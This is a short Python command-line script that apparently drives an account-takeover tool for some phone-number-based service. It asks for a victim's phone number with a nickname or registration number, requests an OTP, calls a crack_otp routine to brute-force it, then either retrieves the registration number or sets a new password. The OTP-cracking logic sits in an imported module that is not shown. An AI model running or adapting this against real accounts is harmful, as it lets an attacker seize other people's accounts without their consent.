from assist import ChangePassword, getRegNumber

print("""
what do you want?

1) Get registration number from Nickname & Phone Number
                      Or,
2) Change pasword using Phone Number & Registration number

""")

choice = int(input("(1/2): "))
phone = input("PhoneNumber(example:88017********): ")
if choice==1:
    nickname = input("Type nickname(case sensitive): ")
    target = getRegNumber(phone,nickname)
    target.req_otp()
    target.crack_otp()
elif choice==2:
    registration = input("Registration number:")
    target = ChangePassword(phone, registration)
    target.req_otp()
    target.crack_otp()
    NewPassword = input("Type a new password (atleast 6 charecters long):")
    target.changePass(NewPassword)
else:
    print("Invalid input")
    exit()
